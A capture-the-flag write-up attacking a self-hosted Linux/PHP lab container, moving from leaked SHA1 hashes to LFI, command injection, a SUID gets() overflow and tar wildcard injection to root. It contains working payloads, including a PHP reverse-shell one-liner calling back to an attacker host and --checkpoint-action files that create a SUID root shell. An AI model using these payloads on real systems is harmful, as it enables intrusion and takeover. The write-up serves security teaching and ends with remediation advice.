---
title: "ProjectManager1"
date: 2026-08-11
categories: [Custom, Easy]
tags: [linux, apache, php, information disclosure, sensitive data exposure, sha1, hashcat, credential reuse, LFI, php filter, command injection, RCE, reverse shell, SUID, buffer overflow, gets, sudo, tar wildcard, gtfobins, docker]
image:
  path: /assets/img/Custom/ProjectManager1/banner.png
  alt: ProjectManager1 writeup
---

A world-readable `users.json` leaked SHA1 password hashes that cracked against `rockyou.txt`, giving a web session; a directory-traversal / LFI flaw in `dashboard.php?dir=` then exposed a second credential file and let me read `admin.php` source through a `php://filter` wrapper, revealing an `exec()` sink fed with unsanitised input. That command injection gave a `www-data` reverse shell, credential reuse got me to `melendez`, a `gets()` buffer overflow in a SUID binary escalated to `monre`, and a `sudo`-able backup script wrapping `tar` with a wildcard closed the chain to `root` via checkpoint-action injection.

| Field      | Details            |
|------------|--------------------|
| Platform   | Custom (self-made) |
| Difficulty | Easy               |
| OS         | Linux              |
| IP         | 172.30.0.2         |
| Date       | August 2026        |

## Tools Used

| Tool     | Description                                                              |
|----------|-------------------------------------------------------------------------|
| arp-scan | Layer-2 host discovery on the local Docker bridge                       |
| nmap     | TCP port scanning and service/version fingerprinting                    |
| gobuster | Directory and file brute-forcing over HTTP                              |
| curl     | Fetching exposed JSON files and interacting with the app from the CLI   |
| hashcat  | Offline cracking of the leaked SHA1 hashes                              |
| netcat   | Reverse-shell listener for the command-injection callback               |

## Deployment

This is a self-made, publicly available Docker box; the target is a container published on an internal bridge network. It clones and boots from GitHub, which is worth noting because the container hostname in the shell prompts below is an ephemeral Docker ID (I redeployed a couple of times during testing, so the prompts have been normalised to a single identifier for readability):

```bash
git clone https://github.com/andermonreal/ProjectManager.git
cd ProjectManager/
chmod +x start.sh
./start.sh
[+] Building 17.0s (10/10) FINISHED
9c46fb0ee2a0e9044a22d131c97a33a361aae4c2e5069175e37b40858d79f107
```

## Reconnaissance & Enumeration

The objective of this phase was to enumerate the exposed services and identify the application stack worth attacking.

### Host Discovery

Because the box lives on an internal Docker bridge rather than a routed VPN subnet, host discovery starts at layer 2. First I identified the bridge interface and its network, then swept it with `arp-scan`:

```bash
ip a
27: br-8af8885567c4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether c2:b5:ff:af:d8:13 brd ff:ff:ff:ff:ff:ff
    inet <ATTACKER_IP>/24 brd 172.30.0.255 scope global br-8af8885567c4

sudo arp-scan -I br-8af8885567c4 --localnet
Interface: br-8af8885567c4, type: EN10MB, MAC: c2:b5:ff:af:d8:13, IPv4: <ATTACKER_IP>
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.30.0.2	9a:eb:39:fe:f2:4b	(Unknown: locally administered)
1 packets received by filter, 0 packets dropped by kernel
```

The only other host on the segment is `172.30.0.2` — the target container. A single ICMP echo confirms reachability and hints at the OS via the TTL:

```bash
ping -c 1 172.30.0.2
PING 172.30.0.2 (172.30.0.2) 56(84) bytes of data.
64 bytes from 172.30.0.2: icmp_seq=1 ttl=64 time=0.043 ms
```

A TTL of 64 indicates a Linux host (default 64; on the same bridge there's no routing hop to decrement it). The sub-millisecond latency is expected for a local container.

### Port Scan

A full TCP sweep at a high packet rate, written to a grepable file, establishes the entire attack surface before any deep probing:

```bash
sudo nmap -p- --min-rate 5000 -vvv -sS -Pn -n 172.30.0.2 -oG allPorts
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 9A:EB:39:FE:F2:4B (Unknown)
Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
```

Here `-Pn` skips host discovery (ICMP already proved liveness), `-n` disables reverse DNS for speed, `-sS` is a SYN/stealth scan, and `--min-rate 5000` is the speed trade-off. Only one port is open. A targeted scan with service detection and default scripts fingerprints it:

```bash
sudo nmap -p80 -sCV 172.30.0.2 -oN nmap
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.66 (Ubuntu)
|_http-title: Project Manager - Welcome
```

The stack is Apache on Ubuntu serving a PHP application ("Project Manager"). The `PHPSESSID` cookie without the `httponly` flag is a minor hygiene issue, but the whole engagement lives on port 80, so the web app is the entire attack surface.

### Web Application Enumeration

The landing page is a marketing front for the "ProjectManager" SaaS, with a login gate behind it.

![ProjectManager1 landing page served on port 80](/assets/img/Custom/ProjectManager1/cap1.png)

With the framework identified as raw PHP, content discovery targets `.php` and `.json` extensions on top of directories:

```bash
gobuster dir -u http://172.30.0.2 -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x php,json
about_us.php         (Status: 200) [Size: 2864]
admin.php            (Status: 302) [Size: 0] [--> login.php]
css                  (Status: 301) [Size: 346] [--> http://172.30.0.2/css/]
dashboard.php        (Status: 302) [Size: 0] [--> login.php]
index.php            (Status: 200) [Size: 2034]
js                   (Status: 301) [Size: 345] [--> http://172.30.0.2/js/]
login.php            (Status: 200) [Size: 1260]
logout.php           (Status: 302) [Size: 0] [--> login.php]
projects             (Status: 301) [Size: 351] [--> http://172.30.0.2/projects/]
users.json           (Status: 200) [Size: 6512]
```

`admin.php` and `dashboard.php` redirect unauthenticated users to `login.php`, which is expected — they gate content behind a session. The finding that matters is `users.json` returning `200`: an application data file served directly by Apache with no authentication in front of it.

## Exploitation

### Sensitive Data Exposure — `users.json`

Serving the user database as a static JSON file next to the application is a classic information-disclosure mistake. Fetching it dumps every account, including password hashes:

```bash
curl -s http://172.30.0.2/users.json
[
  {
    "username": "jdoe",
    "email": "jdoe@example.com",
    "phone": "555-123-4567",
    "address": "123 Elm Street, Springfield",
    "password": "736fd5e59bc62eb1fbb144b8c8706a0a13e65e9b",
    "projects": [ ... ]
  },
  {
    "username": "asmith",
    "password": "b55be3ebd5ed9d8e71ea7b341ed9f436aeb65839",
    ...
  },
  ... (8 users total)
]
```

The passwords are 40-hex-character strings — unsalted SHA1 digests. Rather than crack the file by hand, a short pipeline extracts just the hash values into a wordlist-ready file:

```bash
curl -s http://172.30.0.2/users.json | grep "password" | awk '{printf $NF}' | sed 's/",/\n/g' | sed 's/"//g' > hashes.txt
736fd5e59bc62eb1fbb144b8c8706a0a13e65e9b
b55be3ebd5ed9d8e71ea7b341ed9f436aeb65839
9ad8c653d2514a5c0d97fa6ab6c4c5b2269b7e0b
a1fc51f35b606c97f3136184ea1285045a14d3a7
ab0edb614669891df5d103ca6e96df53d850098b
6d03ea92dc1216c5d254b768239a73adbf03b0de
8c4e1f1567335f2849f3dbbdbb3c4ae614e780b7
1d3a5fcb248d6f4b4cc1964e881c98e5d2585025
```

`grep` pulls the password lines, `awk '{printf $NF}'` keeps only the last field (the quoted hash), and the two `sed` passes strip the JSON punctuation. Running these unsalted SHA1 hashes against `rockyou.txt` with hash-mode `100` cracks two of them almost instantly:

```bash
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt
ab0edb614669891df5d103ca6e96df53d850098b:brownie
b55be3ebd5ed9d8e71ea7b341ed9f436aeb65839:greenapple
Recovered........: 2/8 (25.00%) Digests (total)
```

Correlating the cracked hashes back to the JSON gives two valid application accounts:

```text
dlbrown:brownie
asmith:greenapple
```

`asmith:greenapple` authenticates cleanly against the login form, dropping into the workspace dashboard.

![Signing in to the dashboard as asmith](/assets/img/Custom/ProjectManager1/cap2.png)

![The asmith dashboard after authentication](/assets/img/Custom/ProjectManager1/cap3.png)

### Local File Inclusion — `dashboard.php?dir=`

The dashboard has a "Project Files" browser. Inspecting its source shows the file panel is driven by a `dir` parameter (`dashboard.php?dir=projects/asmith#files`) — a filename-shaped parameter fed straight into a file/directory read is the textbook signature of a path-traversal / LFI bug. Pointing it at the current working directory instead of a project folder confirms it:

```text
http://172.30.0.2/dashboard.php?dir=./
```

Instead of an `asmith` project listing, the panel enumerates the application root, exposing files that content discovery never linked to — most notably an oddly named admin credential dump:

![Directory listing via LFI exposing adminsCreds43Fb3r8723FDSbncv43.json](/assets/img/Custom/ProjectManager1/cap4.png)

The `adminsCreds43Fb3r8723FDSbncv43.json` name is security-through-obscurity: unguessable by brute force, but trivially exposed once directory listing is possible. Fetching it yields two more SHA1 hashes, this time for administrator accounts:

```bash
curl -s http://172.30.0.2/adminsCreds43Fb3r8723FDSbncv43.json
[
    {
        "username": "melendez",
        "password": "53ec18a0217472b20f662b347c74ceeda67dd1b8",
        ...
    },
    {
        "username": "monre",
        "password": "5d965f573297385c5f61d88be4d97c32e021c989",
        ...
    }
]
```

Same extraction and cracking approach as before. Only the `melendez` hash falls to `rockyou.txt`; the `monre` hash never cracks (it isn't needed — `monre` is reached later through a SUID binary, not a password):

```bash
curl -s http://172.30.0.2/adminsCreds43Fb3r8723FDSbncv43.json | grep "password" | awk '{printf $NF}' | sed 's/",/\n/g' | sed 's/"//g' > moreHashes.txt

hashcat -m 100 moreHashes.txt /usr/share/wordlists/rockyou.txt
53ec18a0217472b20f662b347c74ceeda67dd1b8:melendez123
Recovered........: 1/1 (100.00%) Digests (total)
```

`melendez:melendez123` logs in with administrator privileges, unlocking the Admin Panel that `asmith` couldn't reach.

![Admin Panel reached as melendez](/assets/img/Custom/ProjectManager1/cap5.png)

#### Reading source with a `php://filter` wrapper

The LFI does more than list directories — it includes files. Requesting `admin.php` directly through it would simply execute the PHP server-side and return only its rendered HTML, hiding the logic. The `php://filter` wrapper solves this: chaining `convert.base64-encode` makes PHP read the target as a stream and Base64-encode it *before* the include engine can execute it, so the raw source comes back as text.

```text
http://172.30.0.2/dashboard.php?dir=php://filter/convert.base64-encode/resource=admin.php
```

![admin.php source disclosed as Base64 through the php filter wrapper](/assets/img/Custom/ProjectManager1/cap6.png)

Decoding the Base64 blob reveals the "Add New User" handler. The interesting part is how it logs new accounts:

```php
$username = $_POST['username'];
$email    = $_POST['email'];
$phone    = $_POST['phone'];
$address  = $_POST['address'];
$password = sha1($_POST['password']);
// ...
$logMessage = "New user added: $username, email: $email, phone: $phone, address: $address";
exec("echo $logMessage >> ./user_creation.log");
```

### Command Injection → RCE

The bug is the `exec()` call. `$logMessage` interpolates raw `$_POST` fields — `$address` among them — directly into a string that is handed to a shell. The only sanitisation in the whole handler is `htmlspecialchars()`, and it's applied solely to the success message echoed back to the browser, not to the value that reaches `exec()`. Anything I put in `Address` executes as a shell command in the context of the web server user.

I verified it with a harmless probe first: creating a user with the `Address` field set to `test; id`. The `;` terminates the `echo` and starts a second command.

![Command injection via the Address field in the Add New User form](/assets/img/Custom/ProjectManager1/cap7.png)

Because the injected output is appended to `user_creation.log`, and that log is itself readable through the LFI, I can confirm execution by reading the log back:

![user_creation.log leaking id output, confirming code execution as www-data](/assets/img/Custom/ProjectManager1/cap8.png)

```text
http://172.30.0.2/dashboard.php?dir=.%2F%2Fuser_creation.log#files

New user added: johndoe, email: johndoe@example.com, phone: 1234567890, address: 123 Elm Street, Springfield
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `uid=33(www-data)` line is the confirmation: arbitrary commands run as `www-data`. Upgrading from a blind write to an interactive session just means swapping the probe for a reverse shell. I started a listener and set the `Address` field to a PHP one-liner callback:

```text
Address: test; php -r '$sock=fsockopen("<ATTACKER_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.30.0.2 53968
/bin/sh: 0: can't access tty; job control turned off
$
```

The listener caught the callback as `www-data`. A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable.

## Lateral Movement — `www-data` → `melendez`

`www-data` is a service account with no flag. Enumerating which humans actually have login shells narrows the lateral-movement targets:

```bash
www-data@b82581628977:/var/www/html$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
melendez:x:1001:1001::/home/melendez:/bin/bash
monre:x:1002:1002::/home/monre:/bin/bash
```

`melendez` exists as a system user, and I already cracked the application password `melendez123` for that same name. Password reuse between the application layer and the OS layer is one of the most common lateral-movement primitives, so trying it against `su` is the obvious first move:

```bash
www-data@b82581628977:/var/www/html$ su melendez
Password:
melendez@b82581628977:/var/www/html$ cd
melendez@b82581628977:~$ ls
adminAuth  user.txt
melendez@b82581628977:~$ cat user.txt
```

The application admin and the OS user share `melendez123`. This is the foothold proper — `melendez` holds `user.txt`.

## Privilege Escalation

### `melendez` → `monre` — Buffer Overflow in the `adminAuth` SUID binary

Alongside `user.txt` sits a custom binary, `adminAuth`. Its permissions are the whole story:

```bash
melendez@b82581628977:~$ ls -la adminAuth
-rwsr-xr-x 1 monre monre 16432 Aug 11 15:24 adminAuth
```

The `s` in `-rwsr-xr-x` is the SUID bit, and the owner is `monre`. Any code the binary executes runs with `monre`'s effective UID, regardless of who launches it. Running it presents an "access code" prompt that rejects normal input:

```bash
melendez@b82581628977:~$ ./adminAuth
=== Project Manager :: Admin Access Verification ===
Enter your access code: 1
[-] Access denied.
melendez@b82581628977:~$ ./adminAuth
=== Project Manager :: Admin Access Verification ===
Enter your access code: -123
[-] Access denied.
```

No numeric input passes the check. The vulnerability is in *how* the code is read. The binary uses `gets()` to read the access code into a fixed-size stack buffer, and `gets()` performs no bounds checking whatsoever — it keeps writing past the end of the buffer until it hits a newline. A sufficiently long input overflows the buffer and overwrites the adjacent stack memory that governs the authorization decision, flipping the program onto its "access granted" branch, which spawns a shell. Because the binary is SUID `monre`, that shell is a `monre` shell:

```bash
melendez@b82581628977:~$ ./adminAuth
=== Project Manager :: Admin Access Verification ===
Enter your access code: 11111111111111111111111111111111111

[+] Access code accepted. Launching admin shell...
monre@b82581628977:~$
```

No exploit development was required here — a long-enough string is enough to corrupt the check. In a hardened target you'd inspect the binary with `checksec` and craft a precise overflow in `gdb`, but this box wanted the `gets()` lesson, not a ROP chain.

### `monre` → `root` — `sudo` `tar` wildcard injection via `backup.sh`

The first check as `monre` is what he can run as `root`:

```bash
monre@b82581628977:~$ sudo -l
User monre may run the following commands on b82581628977:
    (root) NOPASSWD: /opt/pm/backup.sh

monre@b82581628977:~$ ls /opt/pm -la
total 12
drwxr-xr-x 1 root root 4096 Aug 11 17:00 .
drwxr-xr-x 1 root root 4096 Aug 11 17:00 ..
-rwxr-xr-x 1 root root  478 Aug 11 16:59 backup.sh
```

`monre` can execute `/opt/pm/backup.sh` as `root` without a password. The script is root-owned and not writable by `monre`, so the script body itself can't be edited — the escalation has to come from how it operates. `backup.sh` archives `/var/www/uploads` with `tar` using a wildcard (`tar czf ... *`), and that wildcard is the flaw.

When a shell expands `*`, it turns every filename in the directory into a separate argument. `tar` then parses those arguments, and it treats anything that looks like an option as an option — even if it originated as a filename. By dropping files whose *names* are `tar` command-line flags, I can smuggle options into a command I don't control. The GTFOBins `--checkpoint` / `--checkpoint-action` pair is the canonical vector: `--checkpoint=1` tells `tar` to fire an action after the first record, and `--checkpoint-action=exec=...` defines that action as an arbitrary command.

I staged a small payload script and the two option-named files in the directory `tar` will archive:

```bash
monre@b82581628977:/opt/pm$ cd /var/www/uploads/
monre@b82581628977:/var/www/uploads$ echo "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash" > x.sh
monre@b82581628977:/var/www/uploads$ echo > "--checkpoint=1"
monre@b82581628977:/var/www/uploads$ echo > "--checkpoint-action=exec=bash x.sh"
```

`x.sh` copies `bash` to `/tmp/rootbash` and sets it SUID. When `backup.sh` runs `tar` over the directory, the wildcard expands `--checkpoint=1` and `--checkpoint-action=exec=bash x.sh` into real `tar` options, and `tar` — running as `root` — executes `x.sh`:

```bash
monre@b82581628977:/var/www/uploads$ sudo /opt/pm/backup.sh
[*] Backing up /var/www/uploads ...
[+] Backup written to /var/backups/uploads-2026-08-11.tgz

monre@b82581628977:/var/www/uploads$ ls -la /tmp/
-rwsr-xr-x 1 root root 1540520 Aug 11 17:10 rootbash
```

`/tmp/rootbash` is now a root-owned SUID copy of `bash`. Invoking it with `-p` preserves the effective UID instead of dropping privileges, landing a root shell:

```bash
monre@b82581628977:/var/www/uploads$ cd /tmp/
monre@b82581628977:/tmp$ ./rootbash -p
rootbash-5.3# whoami
root
rootbash-5.3# cat /root/root.txt
```

Full compromise achieved.

## Flags

| Flag     | Value      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Key Takeaways

- **Application data files served next to the app are an authentication bypass by another name.** `users.json` and `adminsCreds43Fb3r8723FDSbncv43.json` were never meant to be fetched directly, but Apache happily served them as static content. An unguessable filename is not access control — the moment directory listing or an LFI is possible, obscurity buys nothing.

- **Unsalted SHA1 is not password storage, it's a lookup key.** Fast, unsalted hashes fall to a wordlist in seconds. The distance between "we hash our passwords" and "our passwords are cracked" is one `hashcat` invocation; only a slow, salted KDF (bcrypt, argon2) changes that arithmetic.

- **`php://filter/convert.base64-encode` turns an include-based LFI into source-code disclosure.** When a file inclusion executes PHP instead of showing it, the Base64 wrapper reads the file as a stream and encodes it before execution, handing you the raw source. Source disclosure then hands you every server-side bug for free.

- **Never build a shell command string from user input.** The `exec("echo $logMessage ...")` sink concatenated raw POST fields into a command line; `htmlspecialchars()` on the *display* string did nothing for the *shell* string. Output encoding and command sanitisation are different problems — use `escapeshellarg()`, or better, don't shell out at all.

- **Credential reuse across the app/OS boundary is reflexive to check.** The same `melendez123` unlocked both an application admin account and a system login. After cracking any application hash, testing it against `/etc/passwd` users via `su`/`ssh` should be automatic, not an afterthought.

- **`gets()` has no safe use.** A SUID binary that reads input with `gets()` is exploitable by definition; the missing bounds check lets a long string corrupt whatever the program relies on next. The fix is `fgets()` with a length bound — there is no configuration that makes `gets()` acceptable.

- **A wildcard in a privileged `tar`/`chown`/`rsync` command is a root shell waiting to happen.** Filenames become arguments, and arguments that look like options *are* options. Any `sudo`-able script that expands `*` inside `tar` is vulnerable to `--checkpoint-action` injection — pin exact paths and pass `--` before file arguments.
